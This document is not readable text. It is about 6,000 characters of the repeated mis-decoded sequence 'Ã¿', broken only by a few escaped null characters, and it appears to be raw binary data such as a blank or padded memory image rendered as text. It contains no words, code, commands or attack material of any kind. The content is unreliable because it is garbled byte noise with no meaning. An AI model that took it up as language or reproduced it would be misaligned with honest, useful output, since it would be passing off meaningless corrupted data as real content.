Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã